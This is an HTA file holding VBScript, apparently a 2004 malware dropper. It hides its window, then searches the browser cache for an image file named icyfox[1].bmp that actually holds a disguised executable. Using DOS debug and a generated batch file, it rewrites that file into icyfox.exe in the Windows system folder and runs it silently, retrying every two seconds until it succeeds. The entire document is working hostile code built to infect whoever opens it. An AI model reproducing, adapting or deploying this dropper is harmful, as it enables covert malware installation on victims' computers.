
<SCRIPT LANGUAGE="VBScript">
Option Explicit
window.moveto 0,0
window.resizeto 0,0
'Bye ¸ßÉ½ 2004.6        
Dim FSO,WSH,CACHE,str,sucess
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WSH = CreateObject("WScript.Shell")
CACHE=wsh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache")
sucess=0

sub FF
 SearchTmpFile fso.GetFolder(CACHE),"icyfox[1].bmp"
 if sucess=0 then SearchTmpFile fso.GetFolder(CACHE),"icyfox[2].bmp"
End sub


Function SearchTmpFile(Folder,fname)
   Dim SubFolder,File,Lt,tmp,winsys
   str=FSO.GetParentFolderName(folder) & "\" & folder.name & "\" & fname');
   if FSO.FileExists(str) then
      tmp=fso.GetSpecialFolder(2) & "\"
      winsys=fso.GetSpecialFolder(1) & "\"
      set File=FSO.GetFile(str)
      File.Copy(tmp & "tmp.dat")
      On Error Resume Next
      File.Delete
      if FSO.FileExists(str) then exit function
      set Lt=FSO.CreateTextFile(tmp & "tmp.in")
      Lt.WriteLine("rbx")
      Lt.WriteLine("0")
      Lt.WriteLine("rcx")
      'http://gaoshans.533.net            
      Lt.WriteLine("A4EB")
      Lt.WriteLine("w136")
      Lt.WriteLine("q")
      Lt.Close
      set Lt=FSO.CreateTextFile(tmp & "tmp.bat")
      Lt.WriteLine("@echo off")
      Lt.WriteLine("debug " & tmp & "tmp.dat <" & tmp & "tmp.in >" & tmp & "tmp.out")
      Lt.WriteLine("copy " & tmp & "tmp.dat " & winsys & "icyfox.exe>" & tmp & "tmp.out")
      Lt.WriteLine("del " & tmp & "tmp.dat >" & tmp & "tmp.out")
      Lt.WriteLine("del " & tmp & "tmp.in >" & tmp & "tmp.out")
      Lt.WriteLine(winsys & "icyfox.exe")
      Lt.Close
      WSH.Run tmp & "tmp.bat",false,6
On Error Resume Next
     
sucess=1
window.close()
window.close()
end if
if Folder.SubFolders.Count<>0 then
for each SubFolder In Folder.SubFolders
SearchTmpFile SubFolder,fname
next
end if
End Function
</script>
<script language=JavaScript>
function F()
{
FF();
if (sucess==0) setTimeout("F()",2000);
}
setTimeout("F()",2000);
</script>
<HTA:APPLICATION caption="no" border="none" SHOWINTASKBAR="no">                              
<body>
                             
</body>
</html>
